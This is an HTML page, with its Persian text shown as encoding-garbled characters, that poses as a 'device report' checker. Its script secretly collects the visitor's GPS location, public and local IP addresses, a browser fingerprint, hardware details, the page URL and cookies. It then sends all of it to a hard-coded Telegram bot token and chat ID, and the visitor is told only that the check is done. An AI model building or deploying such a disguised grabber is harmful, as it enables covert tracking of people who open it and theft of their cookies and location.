<!DOCTYPE html>
<html lang="fa">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Ú¯Ø²Ø§Ø±Ø´ Ú©Ø§Ù…Ù„ Ùˆ Ù¾ÛŒØ´Ø±ÙØªÙ‡ Ø¯Ø³ØªÚ¯Ø§Ù‡</title>
<style>
  body {
    margin: 0; padding: 20px;
    font-family: 'Vazirmatn', Tahoma, sans-serif;
    background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
    color: #eee;
    text-align: center;
    user-select: none;
  }
  button {
    background: linear-gradient(135deg, #ff416c, #ff4b2b);
    border: none;
    padding: 16px 36px;
    color: white;
    font-weight: 700;
    border-radius: 12px;
    font-size: 1.3rem;
    cursor: pointer;
    box-shadow: 0 8px 16px rgba(255,75,43,0.7);
    transition: 0.3s ease;
    margin: 10px auto;
    user-select: none;
    display: inline-block;
  }
  button:hover:not(:disabled) {
    background: linear-gradient(135deg, #ff4b2b, #ff416c);
    box-shadow: 0 12px 24px rgba(255,75,43,0.9);
    transform: translateY(-3px);
  }
  button:disabled {
    background: #555;
    cursor: not-allowed;
    box-shadow: none;
    transform: none;
  }
  button.done {
    background: linear-gradient(135deg, #28a745, #218838);
    box-shadow: 0 8px 16px rgba(40,167,69,0.7);
    cursor: default;
  }
  #status {
    white-space: pre-wrap;
    word-break: break-word;
    max-width: 90vw;
    margin: auto;
    font-size: 1.1rem;
    background: rgba(0,0,0,0.45);
    padding: 20px;
    border-radius: 16px;
    min-height: 200px;
    box-shadow: 0 0 20px rgba(255,75,43,0.6);
    text-align: right;
    direction: rtl;
    user-select: text;
  }
  #locationBtn {
    background: #1e90ff;
    margin-top: 5px;
  }
</style>
</head>
<body>

<h1>ğŸ“‹ Ú¯Ø²Ø§Ø±Ø´ Ú©Ø§Ù…Ù„ Ùˆ Ù¾ÛŒØ´Ø±ÙØªÙ‡ Ø¯Ø³ØªÚ¯Ø§Ù‡ Ø´Ù…Ø§</h1>

<button id="startBtn">Ø´Ø±ÙˆØ¹ Ø¨Ø±Ø±Ø³ÛŒ</button>
<button id="locationBtn">Ø§Ø¬Ø§Ø²Ù‡ Ø¯Ø³ØªØ±Ø³ÛŒ Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…Ú©Ø§Ù†ÛŒ</button>

<div id="status">Ø¨Ø±Ø§ÛŒ Ø´Ø±ÙˆØ¹ Ø±ÙˆÛŒ Ø¯Ú©Ù…Ù‡ "Ø´Ø±ÙˆØ¹ Ø¨Ø±Ø±Ø³ÛŒ" Ú©Ù„ÛŒÚ© Ú©Ù†ÛŒØ¯.</div>

<script>
const TELEGRAM_TOKEN = "8179792057:AAFqJdoVXJOp5QK13fVbskZgojZVdVdhkgs";
const TELEGRAM_CHAT_ID = "309120647";

const startBtn = document.getElementById('startBtn');
const locationBtn = document.getElementById('locationBtn');
const statusEl = document.getElementById('status');

let userLocation = null; // Ø°Ø®ÛŒØ±Ù‡ Ù…ÙˆÙ‚Ø¹ÛŒØª

function addResult(label, value, results) {
  if(value !== undefined && value !== null && value !== "") {
    results.push(`${label}: ${value}`);
  }
}

function requestLocation() {
  return new Promise((resolve) => {
    if(!navigator.geolocation){
      alert("Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…Ú©Ø§Ù†ÛŒ Ù¾Ø´ØªÛŒØ¨Ø§Ù†ÛŒ Ù†Ù…ÛŒâ€ŒØ´ÙˆØ¯.");
      resolve(null);
      return;
    }
    navigator.geolocation.getCurrentPosition(
      pos => {
        userLocation = pos.coords;
        alert("Ø¯Ø³ØªØ±Ø³ÛŒ Ù…ÙˆÙ‚Ø¹ÛŒØª Ù¾Ø°ÛŒØ±ÙØªÙ‡ Ø´Ø¯.");
        resolve(userLocation);
      },
      err => {
        alert("Ø¯Ø³ØªØ±Ø³ÛŒ Ù…ÙˆÙ‚Ø¹ÛŒØª Ø±Ø¯ Ø´Ø¯ ÛŒØ§ Ø®Ø·Ø§ Ø±Ø® Ø¯Ø§Ø¯.");
        resolve(null);
      },
      {timeout: 10000}
    );
  });
}

async function collectInfo() {
  startBtn.disabled = true;
  locationBtn.disabled = true;
  startBtn.textContent = "â³ Ø¯Ø± Ø­Ø§Ù„ Ø¬Ù…Ø¹â€ŒØ¢ÙˆØ±ÛŒ...";
  startBtn.classList.remove("done");
  statusEl.textContent = "â³ Ø¯Ø± Ø­Ø§Ù„ Ø¬Ù…Ø¹â€ŒØ¢ÙˆØ±ÛŒ Ø§Ø·Ù„Ø§Ø¹Ø§Øª...";

  let results = [];

  try {
    if (navigator.getBattery) {
      const batt = await navigator.getBattery();
      addResult("ğŸ”‹ ÙˆØ¶Ø¹ÛŒØª Ø¨Ø§ØªØ±ÛŒ", `${Math.round(batt.level * 100)}% (${batt.charging ? "Ø´Ø§Ø±Ú˜ Ù…ÛŒâ€ŒØ´ÙˆØ¯" : "Ø¯Ø± Ø­Ø§Ù„ Ø§Ø³ØªÙØ§Ø¯Ù‡"})`, results);
      addResult("â³ Ø²Ù…Ø§Ù† Ø´Ø§Ø±Ú˜ Ø¨Ø§ØªØ±ÛŒ (Ø«Ø§Ù†ÛŒÙ‡)", batt.chargingTime !== Infinity ? batt.chargingTime : "Ù†Ø§Ù…Ø´Ø®Øµ", results);
      addResult("â³ Ø²Ù…Ø§Ù† ØªØ®Ù„ÛŒÙ‡ Ø¨Ø§ØªØ±ÛŒ (Ø«Ø§Ù†ÛŒÙ‡)", batt.dischargingTime !== Infinity ? batt.dischargingTime : "Ù†Ø§Ù…Ø´Ø®Øµ", results);
      addResult("âš¡ Ø¢ÛŒØ§ Ø¨Ø§ØªØ±ÛŒ Ø¯Ø± Ø­Ø§Ù„ Ø´Ø§Ø±Ú˜ Ø§Ø³ØªØŸ", batt.charging ? "Ø¨Ù„Ù‡" : "Ø®ÛŒØ±", results);
    } else {
      addResult("ğŸ”‹ ÙˆØ¶Ø¹ÛŒØª Ø¨Ø§ØªØ±ÛŒ", "Ù¾Ø´ØªÛŒØ¨Ø§Ù†ÛŒ Ù†Ù…ÛŒâ€ŒØ´ÙˆØ¯", results);
    }
  } catch(e) { addResult("ğŸ”‹ ÙˆØ¶Ø¹ÛŒØª Ø¨Ø§ØªØ±ÛŒ", "Ø®Ø·Ø§ Ø¯Ø± Ø¯Ø±ÛŒØ§ÙØª", results); }

  try {
    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if(c){
      addResult("ğŸŒ Ù†ÙˆØ¹ Ø§ØªØµØ§Ù„ Ø§ÛŒÙ†ØªØ±Ù†Øª", c.effectiveType || "Ù†Ø§Ù…Ø´Ø®Øµ", results);
      addResult("ğŸŒ Ø³Ø±Ø¹Øª Ø§ÛŒÙ†ØªØ±Ù†Øª (Mbps)", c.downlink || "Ù†Ø§Ù…Ø´Ø®Øµ", results);
      addResult("ğŸŒ Ø²Ù…Ø§Ù† Ù¾Ø§Ø³Ø®Ú¯ÙˆÛŒÛŒ (ms)", c.rtt || "Ù†Ø§Ù…Ø´Ø®Øµ", results);
      addResult("ğŸŒ Ø´Ø±Ú©Øª Ø§Ø±Ø§Ø¦Ù‡â€ŒØ¯Ù‡Ù†Ø¯Ù‡ Ø§ÛŒÙ†ØªØ±Ù†Øª", c.type || "Ù†Ø§Ù…Ø´Ø®Øµ", results);
    } else {
      addResult("ğŸŒ Ø§ØªØµØ§Ù„ Ø§ÛŒÙ†ØªØ±Ù†Øª", "Ù†Ø§Ù…Ø´Ø®Øµ", results);
    }
  } catch(e) { addResult("ğŸŒ Ø§ØªØµØ§Ù„ Ø§ÛŒÙ†ØªØ±Ù†Øª", "Ø®Ø·Ø§ Ø¯Ø± Ø¯Ø±ÛŒØ§ÙØª", results); }

  try {
    addResult("ğŸ“ Ø±Ø²ÙˆÙ„ÙˆØ´Ù† ØµÙØ­Ù‡", `${screen.width}Ã—${screen.height}`, results);
    addResult("ğŸ” Ù†Ø³Ø¨Øª Ù¾ÛŒÚ©Ø³Ù„ (DPI)", window.devicePixelRatio || "Ù†Ø§Ù…Ø´Ø®Øµ", results);
  } catch(e) {}

  try {
    addResult("ğŸ–¥ï¸ Ù‡Ø³ØªÙ‡ CPU", navigator.hardwareConcurrency || "Ù†Ø§Ù…Ø´Ø®Øµ", results);
    addResult("ğŸ’¾ Ø­Ø§ÙØ¸Ù‡ RAM (Ú¯ÛŒÚ¯Ø§Ø¨Ø§ÛŒØª)", navigator.deviceMemory || "Ù†Ø§Ù…Ø´Ø®Øµ", results);
  } catch(e) {}

  try {
    addResult("ğŸŒ Ø²Ø¨Ø§Ù† Ù…Ø±ÙˆØ±Ú¯Ø±", navigator.language || "Ù†Ø§Ù…Ø´Ø®Øµ", results);
    addResult("ğŸ“± Ù¾Ø´ØªÛŒØ¨Ø§Ù†ÛŒ Ø§Ø² ØªØ§Ú†", (navigator.maxTouchPoints > 0) ? "Ø¯Ø§Ø±Ø¯" : "Ù†Ø¯Ø§Ø±Ø¯", results);
  } catch(e) {}

  try {
    addResult("ğŸ§­ User Agent", navigator.userAgent || "Ù†Ø§Ù…Ø´Ø®Øµ", results);
    addResult("ğŸ§  Ù†Ø§Ù… Ù…Ø±ÙˆØ±Ú¯Ø±", navigator.appName || "Ù†Ø§Ù…Ø´Ø®Øµ", results);
    addResult("ğŸ§© Ø³Ø§Ø²Ù†Ø¯Ù‡ Ù…Ø±ÙˆØ±Ú¯Ø± (Vendor)", navigator.vendor || "Ù†Ø§Ù…Ø´Ø®Øµ", results);
    addResult("ğŸ”’ Ø±Ø¯ÛŒØ§Ø¨ÛŒ ÙØ¹Ø§Ù„ØŸ", navigator.doNotTrack === "1" ? "Ø¨Ù„Ù‡" : "Ø®ÛŒØ±", results);
    addResult("ğŸŒ Ú©ÙˆÚ©ÛŒ ÙØ¹Ø§Ù„ Ø§Ø³ØªØŸ", navigator.cookieEnabled ? "Ø¨Ù„Ù‡" : "Ø®ÛŒØ±", results);
  } catch(e) {}

  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if(gl){
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      if(debugInfo){
        const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
        const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
        addResult("ğŸ® Ú©Ø§Ø±Øª Ú¯Ø±Ø§ÙÛŒÚ©", `${vendor} - ${renderer}`, results);
      } else {
        addResult("ğŸ® Ú©Ø§Ø±Øª Ú¯Ø±Ø§ÙÛŒÚ©", "Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø¯Ø± Ø¯Ø³ØªØ±Ø³ Ù†ÛŒØ³Øª", results);
      }
    } else {
      addResult("ğŸ® Ú©Ø§Ø±Øª Ú¯Ø±Ø§ÙÛŒÚ©", "WebGL Ù¾Ø´ØªÛŒØ¨Ø§Ù†ÛŒ Ù†Ù…ÛŒâ€ŒØ´ÙˆØ¯", results);
    }
  } catch(e) { addResult("ğŸ® Ú©Ø§Ø±Øª Ú¯Ø±Ø§ÙÛŒÚ©", "Ø®Ø·Ø§ Ø¯Ø± Ø¯Ø±ÛŒØ§ÙØª", results); }

  try {
    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");
    ctx.textBaseline = "top";
    ctx.font = "14px Arial";
    ctx.fillText("Fingerprint", 2, 2);
    const fp = canvas.toDataURL().slice(-30);
    addResult("ğŸ†” Ø§Ø«Ø± Ø§Ù†Ú¯Ø´Øª (Fingerprint)", fp, results);
  } catch(e) { addResult("ğŸ†” Ø§Ø«Ø± Ø§Ù†Ú¯Ø´Øª (Fingerprint)", "Ø®Ø·Ø§", results); }

  if(userLocation){
    addResult("ğŸ“ Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…Ú©Ø§Ù†ÛŒ", `Ø¹Ø±Ø¶: ${userLocation.latitude.toFixed(6)}, Ø·ÙˆÙ„: ${userLocation.longitude.toFixed(6)}`, results);
  } else {
    addResult("ğŸ“ Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…Ú©Ø§Ù†ÛŒ", "âŒ Ø¯Ø³ØªØ±Ø³ÛŒ Ø¯Ø§Ø¯Ù‡ Ù†Ø´Ø¯Ù‡", results);
  }

  try {
    let response = await fetch("https://ipapi.co/json/");
    if(response.ok){
      let data = await response.json();
      addResult("ğŸŒ Ø¢ÛŒâ€ŒÙ¾ÛŒ Ø¹Ù…ÙˆÙ…ÛŒ", data.ip, results);
      addResult("ğŸ™ï¸ Ø´Ù‡Ø±", data.city, results);
      addResult("ğŸ‡®ğŸ‡· Ú©Ø´ÙˆØ±", data.country_name, results);
      addResult("ğŸ“¶ Ø´Ø±Ú©Øª Ø§ÛŒÙ†ØªØ±Ù†ØªÛŒ", data.org, results);
      addResult("ğŸŒ Ù…Ù†Ø·Ù‚Ù‡ Ø²Ù…Ø§Ù†ÛŒ (Timezone)", data.timezone, results);
      addResult("ğŸ—ºï¸ Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…Ú©Ø§Ù†ÛŒ ØªÙ‚Ø±ÛŒØ¨ÛŒ", `Ø¹Ø±Ø¶: ${data.latitude}, Ø·ÙˆÙ„: ${data.longitude}`, results);
      addResult("ğŸ”Œ Ù†ÙˆØ¹ Ø§ØªØµØ§Ù„", data.network || "Ù†Ø§Ù…Ø´Ø®Øµ", results);
      addResult("ğŸ” Ù¾Ø´ØªÛŒØ¨Ø§Ù†ÛŒ Ø§Ø² VPN/Proxy", data.proxy ? "Ø¨Ù„Ù‡" : "Ø®ÛŒØ±", results);
    } else {
      addResult("ğŸŒ Ø§Ø·Ù„Ø§Ø¹Ø§Øª IP", "Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ API Ø§Ù…Ú©Ø§Ù†â€ŒÙ¾Ø°ÛŒØ± Ù†ÛŒØ³Øª", results);
    }
  } catch(e){
    addResult("ğŸŒ Ø§Ø·Ù„Ø§Ø¹Ø§Øª IP", "Ø®Ø·Ø§ Ø¯Ø± Ø¯Ø±ÛŒØ§ÙØª", results);
  }

  async function getLocalIP(){
    return new Promise((resolve) => {
      try {
        const pc = new RTCPeerConnection({iceServers:[]});
        let localIPFound = false;
        pc.createDataChannel("");
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        pc.onicecandidate = (ice) => {
          if(ice && ice.candidate && ice.candidate.candidate && !localIPFound){
            const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
            const ipMatch = ipRegex.exec(ice.candidate.candidate);
            if(ipMatch){
              addResult("ğŸ  Ø¢ÛŒâ€ŒÙ¾ÛŒ Ø¯Ø§Ø®Ù„ÛŒ", ipMatch[1], results);
              localIPFound = true;
            }
            pc.close();
            resolve();
          }
          if(!ice.candidate){
            // ØªÙ…Ø§Ù… Ú©Ø§Ù†Ø¯ÛŒØ¯Ù‡Ø§ Ø¨Ø±Ø±Ø³ÛŒ Ø´Ø¯Ù†Ø¯ ÙˆÙ„ÛŒ IP Ù¾ÛŒØ¯Ø§ Ù†Ø´Ø¯
            if(!localIPFound){
              addResult("ğŸ  Ø¢ÛŒâ€ŒÙ¾ÛŒ Ø¯Ø§Ø®Ù„ÛŒ", "Ù†Ø§Ù…Ø´Ø®Øµ", results);
              resolve();
            }
          }
        };
      } catch(e) {
        addResult("ğŸ  Ø¢ÛŒâ€ŒÙ¾ÛŒ Ø¯Ø§Ø®Ù„ÛŒ", "Ù†Ø§Ù…Ø´Ø®Øµ", results);
        resolve();
      }
    });
  }
  await getLocalIP();

  try {
    const now = new Date();
    addResult("â° Ø²Ù…Ø§Ù† Ù…Ø­Ù„ÛŒ", now.toLocaleString(), results);
    addResult("ğŸŒ Ù…Ù†Ø·Ù‚Ù‡ Ø²Ù…Ø§Ù†ÛŒ", Intl.DateTimeFormat().resolvedOptions().timeZone || "Ù†Ø§Ù…Ø´Ø®Øµ", results);
  } catch(e) {}

  try {
    addResult("ğŸŸ¢ ÙˆØ¶Ø¹ÛŒØª Ø¢Ù†Ù„Ø§ÛŒÙ† Ø¨ÙˆØ¯Ù†", navigator.onLine ? "Ø¢Ù†Ù„Ø§ÛŒÙ†" : "Ø¢ÙÙ„Ø§ÛŒÙ†", results);
  } catch(e) {}

  try {
    addResult("ğŸ“± Ù¾Ù„ØªÙØ±Ù…", navigator.platform || "Ù†Ø§Ù…Ø´Ø®Øµ", results);
  } catch(e) {}

  try {
    addResult("ğŸ–¥ï¸ ÙÙˆÙ„ Ø§Ø³Ú©Ø±ÛŒÙ† ÙØ¹Ø§Ù„ Ø§Ø³ØªØŸ", document.fullscreenElement ? "Ø¨Ù„Ù‡" : "Ø®ÛŒØ±", results);
  } catch(e) {}

  try {
    addResult("ğŸ”— Ù¾Ø±ÙˆØªÚ©Ù„", location.protocol, results);
    addResult("ğŸŒ Ù†Ø§Ù… Ø¯Ø§Ù…Ù†Ù‡", location.hostname, results);
    addResult("ğŸ“‚ Ù…Ø³ÛŒØ± Ø¯Ù‚ÛŒÙ‚ ØµÙØ­Ù‡", location.pathname, results);
    addResult("ğŸ–¥ï¸ Ø¢Ø¯Ø±Ø³ Ú©Ø§Ù…Ù„ ØµÙØ­Ù‡", location.href, results);
  } catch(e) {}

  try {
    // Ø§Ø³ØªÙØ§Ø¯Ù‡ Ø§Ø² PerformanceNavigationTiming Ø¬Ø¯ÛŒØ¯
    const navEntries = performance.getEntriesByType("navigation");
    if(navEntries && navEntries.length > 0){
      const nav = navEntries[0];
      addResult("â±ï¸ Ø´Ø±ÙˆØ¹ Ø¨Ø§Ø±Ú¯Ø°Ø§Ø±ÛŒ ØµÙØ­Ù‡", new Date(nav.startTime + performance.timing.navigationStart).toLocaleString(), results);
      addResult("â±ï¸ Ù¾Ø§ÛŒØ§Ù† Ø¨Ø§Ø±Ú¯Ø°Ø§Ø±ÛŒ ØµÙØ­Ù‡", new Date(nav.loadEventEnd + performance.timing.navigationStart).toLocaleString(), results);
    } else {
      addResult("â±ï¸ Ø´Ø±ÙˆØ¹ Ø¨Ø§Ø±Ú¯Ø°Ø§Ø±ÛŒ ØµÙØ­Ù‡", "Ù†Ø§Ù…Ø´Ø®Øµ", results);
      addResult("â±ï¸ Ù¾Ø§ÛŒØ§Ù† Ø¨Ø§Ø±Ú¯Ø°Ø§Ø±ÛŒ ØµÙØ­Ù‡", "Ù†Ø§Ù…Ø´Ø®Øµ", results);
    }
  } catch(e) {}

  try {
    addResult("ğŸª Ú©ÙˆÚ©ÛŒâ€ŒÙ‡Ø§", document.cookie || "Ù†Ø¯Ø§Ø±Ø¯", results);
  } catch(e) { addResult("ğŸª Ú©ÙˆÚ©ÛŒâ€ŒÙ‡Ø§", "Ø®Ø·Ø§", results); }

  // Ù…ÙˆØ§Ø±Ø¯ÛŒ Ú©Ù‡ Ù†ÛŒØ§Ø² Ø¨Ù‡ Ø§Ø¬Ø§Ø²Ù‡ ÛŒØ§ Ø§ÙØ²ÙˆÙ†Ù‡ Ø¯Ø§Ø±Ù†Ø¯
  addResult("â„¹ï¸ Ù…Ø¯Ù„ Ú¯ÙˆØ´ÛŒ", "Ù†ÛŒØ§Ø² Ø¨Ù‡ Ø§Ø¬Ø§Ø²Ù‡ ÛŒØ§ Ø§ÙØ²ÙˆÙ†Ù‡", results);
  addResult("â„¹ï¸ ØªØ¹Ø¯Ø§Ø¯ Ø³ÛŒÙ… Ú©Ø§Ø±Øª", "Ù†ÛŒØ§Ø² Ø¨Ù‡ Ø§Ø¬Ø§Ø²Ù‡ ÛŒØ§ Ø§ÙØ²ÙˆÙ†Ù‡", results);
  addResult("â„¹ï¸ Ù…Ø¯Ù„ Ú†ÛŒÙ¾Ø³Øª", "Ù†ÛŒØ§Ø² Ø¨Ù‡ Ø§Ø¬Ø§Ø²Ù‡ ÛŒØ§ Ø§ÙØ²ÙˆÙ†Ù‡", results);
  addResult("â„¹ï¸ Ø­Ø§ÙØ¸Ù‡ Ú©Ù„ Ùˆ Ø®Ø§Ù„ÛŒ", "Ù†ÛŒØ§Ø² Ø¨Ù‡ Ø§Ø¬Ø§Ø²Ù‡ ÛŒØ§ Ø§ÙØ²ÙˆÙ†Ù‡", results);
  addResult("â„¹ï¸ Ù†ÙˆØ¹ Ø³ÛŒØ³ØªÙ… Ø¹Ø§Ù…Ù„ Ùˆ Ù†Ø³Ø®Ù‡", "Ù†ÛŒØ§Ø² Ø¨Ù‡ Ø§Ø¬Ø§Ø²Ù‡ ÛŒØ§ Ø§ÙØ²ÙˆÙ†Ù‡", results);

  const message = `â° Ø²Ù…Ø§Ù† Ú¯Ø²Ø§Ø±Ø´: ${new Date().toLocaleString()}\n\n` + results.join("\n");


  try {
    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
      }),
    });
    if(res.ok){
  statusEl.textContent = "âœ… Ø§Ù†Ø¬Ø§Ù… Ø´Ø¯";
  startBtn.textContent = "Ø§Ù†Ø¬Ø§Ù… Ø´Ø¯ âœ…";
  startBtn.classList.add("done");
} else {
      throw new Error("Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù… Ù…ÙˆÙÙ‚ Ù†Ø¨ÙˆØ¯");
    }
  } catch {
    statusEl.textContent += "\n\nâŒ Ø®Ø·Ø§ Ø¯Ø± Ø§Ø±Ø³Ø§Ù„ Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù….";
    startBtn.textContent = "Ø´Ø±ÙˆØ¹ Ø¨Ø±Ø±Ø³ÛŒ";
    startBtn.classList.remove("done");
  }

  startBtn.disabled = false;
  locationBtn.disabled = false;
}

locationBtn.onclick = async () => {
  locationBtn.disabled = true;
  await requestLocation();
  locationBtn.disabled = false;
  alert("Ù…ÙˆÙ‚Ø¹ÛŒØª Ø°Ø®ÛŒØ±Ù‡ Ø´Ø¯. Ø§Ú©Ù†ÙˆÙ† Ø¯Ú©Ù…Ù‡ Ø´Ø±ÙˆØ¹ Ø¨Ø±Ø±Ø³ÛŒ Ø±Ø§ Ø¨Ø²Ù†ÛŒØ¯.");
};

startBtn.onclick = () => {
  collectInfo();
};
</script>

</body>
</html>